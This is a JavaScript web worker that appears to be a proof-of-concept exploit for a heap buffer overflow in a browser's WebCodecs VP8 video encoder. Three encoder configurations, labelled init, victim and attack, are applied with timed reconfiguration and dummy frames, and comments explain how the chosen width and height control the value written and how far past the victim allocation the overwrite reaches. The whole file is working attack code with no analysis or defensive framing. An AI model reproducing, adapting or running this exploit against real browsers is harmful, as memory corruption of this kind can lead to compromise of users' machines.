function reportError(e) {
  // Report error to the main thread
  console.log(e.message);
  postMessage(e.message);
}

// This determines the bounds of our write value and overwrite length
const config_init = {
  codec: "vp8",
  width: 1200,    // This value determines our maximum uint32 write value
  height: 1200,   // This value determines our maximum height aka max overflowing amount
};

// Determines the size of the allocation we are overflowing
const config_victim = {
  codec: "vp8",
  // Requirement: 307200 <= width*height
  // Requirement: config_init.width >= width
  // Requirement: config_init.height >= height
  width:  1000, // cols = ceil(width/16)
  height: 608,  // rows = ceil(height/16)
};

// Overflows the previous allocation
const config_attack = {
  codec: "vp8",
  // Requirement: 307200 > width * height.
  // Requirement: config_init.width >= width > 15
  // Requirement: config_init.height >= height
  // Requirement: ceil(config_victim.height/16) < ceil(height/16)
  width:  16,   // cols' = ceil(width/16).  Controls the u32 value we write.
  height: 720,  // rows' = ceil(height/16). Controls how far we overwrite. overwrite = rows'-rows
};

// If we switch too fast then attack fails
let config_change_timeout = 1000;

function captureAndEncode() {
  function processChunk(chunk, md) {
    console.log(md);
  };

  const init = {
    output: processChunk,
    error: reportError
  };

  // Initial init
  let encoder = new VideoEncoder(init);
  encoder.configure(config_init);

  // Dummy frame used to call encoder
  let vfInit = {format: 'NV12', timestamp: 0, codedWidth: 4, codedHeight: 2};
  let data = new Uint8Array([
    1, 2, 3, 4, 5, 6, 7, 8,  // y
    1, 2, 3, 4,              // uv
  ]);

  async function initialize_encoder() {
    let frame = new VideoFrame(data, vfInit);
    // Use config_init to allocate the bounds
    encoder.encode(frame, { keyFrame: true });
    frame.close();
    vfInit.timestamp += 100;
    // Prepare our victim allocation
    encoder.configure(config_victim);
    setTimeout(prepare_victim, config_change_timeout);
  };

  async function prepare_victim() {
    let frame = new VideoFrame(data, vfInit);
    // Ensure our victim is allocated
    encoder.encode(frame, { keyFrame: true });
    frame.close();
    vfInit.timestamp += 100;
    // Now here's our attacking config
    encoder.configure(config_attack);
    setTimeout(overflow, config_change_timeout);
  };

  async function overflow() {
    let frame = new VideoFrame(data, vfInit);
    // Overwrite the victim allocation
    encoder.encode(frame, { keyFrame: true });
    frame.close();
  };

  setTimeout(initialize_encoder, config_change_timeout);
}

self.onmessage = async function(e) {
  captureAndEncode();
}